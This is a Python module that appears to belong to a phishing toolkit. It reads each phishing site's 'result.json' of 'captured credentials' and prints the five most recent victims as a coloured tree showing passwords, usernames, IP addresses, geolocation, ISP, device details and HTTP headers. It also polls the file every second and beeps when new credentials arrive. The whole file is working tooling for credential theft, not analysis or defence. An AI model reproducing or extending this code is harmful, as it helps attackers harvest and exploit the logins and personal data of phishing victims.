import os

import time

import json

from utils import CREDENTIALS_DIR, RESET



class Color:

    HEADER = '\033[95m'                 

    BLUE = '\033[94m'

    CYAN = '\033[96m'

    GREEN = '\033[92m'

    YELLOW = '\033[93m'

    RED = '\033[91m'

    BOLD = '\033[1m'

    UNDERLINE = '\033[4m'

    RESET = '\033[0m'



def get_credential_count(site_name):

    site_dir = os.path.join(CREDENTIALS_DIR, site_name)

    credentials_file = os.path.join(site_dir, "result.json")

    if not os.path.exists(credentials_file):

        return 0

    try:

        with open(credentials_file, "r") as f:

            data = json.load(f)

            if isinstance(data, list):

                return len(data)

    except Exception:

        pass

    return 0



def format_value(key, value):

    """Returns a tuple (icon, color, formatted_value) based on key content"""

    k_lower = str(key).lower()

    val_str = str(value)

    

    if 'pass' in k_lower:

        return "🔑", Color.RED, val_str

    elif 'user' in k_lower or 'email' in k_lower or 'login' in k_lower:

        return "👤", Color.CYAN, val_str

    elif 'ip' in k_lower:

        return "💻", Color.BOLD, val_str

    elif 'url' in k_lower or 'host' in k_lower or 'referer' in k_lower:

        return "🔗", Color.RESET, val_str

    elif 'agent' in k_lower:

        return "📱", Color.RESET, val_str

    elif 'country' in k_lower:

        return "🏳️ ", Color.RESET, val_str

    elif 'city' in k_lower:

        return "🏙️ ", Color.RESET, val_str

    elif 'lat' in k_lower or 'lon' in k_lower:

        return "📍", Color.RESET, val_str

    elif 'isp' in k_lower:

        return "🏢", Color.RESET, val_str

    

    return "🔹", Color.RESET, val_str



def print_category(category_name, category_icon, data_dict, is_last_category):

    """Prints a whole branch of the tree"""

    if not data_dict:

        return



    branch_char = "└──" if is_last_category else "├──"

    print(f"{Color.BLUE}{branch_char}{Color.RESET} {category_icon} {Color.YELLOW}{category_name}{Color.RESET}")



    child_prefix = "    " if is_last_category else "│   "



    items = list(data_dict.items())

    for i, (key, value) in enumerate(items):

        is_last_item = (i == len(items) - 1)

        item_branch = "└──" if is_last_item else "├──"

        

        icon, val_color, fmt_val = format_value(key, value)

        

        display_key = str(key).replace('_', ' ').title()

        

        print(f"{Color.BLUE}{child_prefix}{item_branch}{Color.RESET} {icon} {display_key}: {val_color}{fmt_val}{Color.RESET}")



def print_credentials(site_name):

    site_dir = os.path.join(CREDENTIALS_DIR, site_name)

    credentials_file = os.path.join(site_dir, "result.json")

    

    if not os.path.exists(credentials_file):

        return



    try:

        with open(credentials_file, 'r', encoding='utf-8') as f:

            data = json.load(f)

    except Exception:

        return



    if not data:

        return



    if not isinstance(data, list):

        data = [data]



                                       

    recent_entries = data[-5:][::-1]



    print(f"\n{Color.HEADER}{Color.BOLD}🌳 Latest Captured Credentials:{Color.RESET}\n")



    for i, entry in enumerate(recent_entries, 1):

        actual_index = len(data) - i + 1

        

        timestamp = entry.get('timestamp', 'N/A')



        raw_data = entry.get('data', {})

        form_data = {}

        if isinstance(raw_data, dict) and 'form_data' in raw_data:

            form_data = raw_data.get('form_data', {})

                                                                             

            for k, v in raw_data.items():

                if k not in ['form_data', 'client_env'] and isinstance(v, (str, int, float, bool)):

                     form_data[k] = v

        else:

            form_data = raw_data



        client_info = entry.get('client_info', {})

        if not client_info and 'meta' in entry:

            client_info = entry.get('meta', {})



        geo_data = {}

        headers_data = {}

        client_env_data = {}

        network_data = {}

        

        if isinstance(raw_data, dict) and 'client_env' in raw_data:

             client_env_data = raw_data['client_env']



        for k, v in client_info.items():

            if k == 'geo' and isinstance(v, dict):

                geo_data = v

            elif k == 'headers' and isinstance(v, dict):

                headers_data = v

            elif k == 'client_env' and isinstance(v, dict):

                client_env_data = v

            elif isinstance(v, dict):

                                                                     

                network_data[k] = str(v)

            else:

                network_data[k] = v



        print(f"{Color.GREEN}📦 Entry #{actual_index}{Color.RESET}")

        

                                       

        print(f"{Color.BLUE}├──{Color.RESET} 🕒 {Color.BOLD}Time:{Color.RESET} {timestamp}")



        categories = []

        

        if form_data:

            categories.append({"name": "Credentials", "icon": "🔐", "data": form_data})

        if geo_data:

            categories.append({"name": "Geo-Location", "icon": "🌍", "data": geo_data})

        if network_data:

            categories.append({"name": "Network & Device", "icon": "📡", "data": network_data})

        if client_env_data:

            categories.append({"name": "Client Environment", "icon": "🖥️ ", "data": client_env_data})

        if headers_data:

            categories.append({"name": "HTTP Headers", "icon": "📨", "data": headers_data})



        for idx, cat in enumerate(categories):

            is_last = (idx == len(categories) - 1)

            print_category(cat['name'], cat['icon'], cat['data'], is_last)

            

        print("")          



def monitor_credentials(site_name):

    site_dir = os.path.join(CREDENTIALS_DIR, site_name)

    credentials_file = os.path.join(site_dir, "result.json")

    

    last_count = 0

    if not os.path.exists(credentials_file):

        os.makedirs(site_dir, exist_ok=True)

        with open(credentials_file, 'w') as f:

            json.dump([], f)

    else:

        try:

            with open(credentials_file, 'r') as f:

                last_count = len(json.load(f))

        except json.JSONDecodeError:

            last_count = 0

            

    print(f"\n{Color.BOLD}{Color.BLUE}Waiting for credentials... (Ctrl+C to stop){Color.RESET}")

    try:

        while True:

            current_count = 0

            try:

                if os.path.exists(credentials_file):

                    with open(credentials_file, 'r') as f:

                        data = json.load(f)

                        current_count = len(data)

            except (json.JSONDecodeError, OSError):

                pass



            if current_count > last_count:

                print_credentials(site_name)

                last_count = current_count

                try:

                    import winsound

                    winsound.Beep(1000, 300)

                except:

                    pass

            

            time.sleep(1)

    except KeyboardInterrupt:

        pass

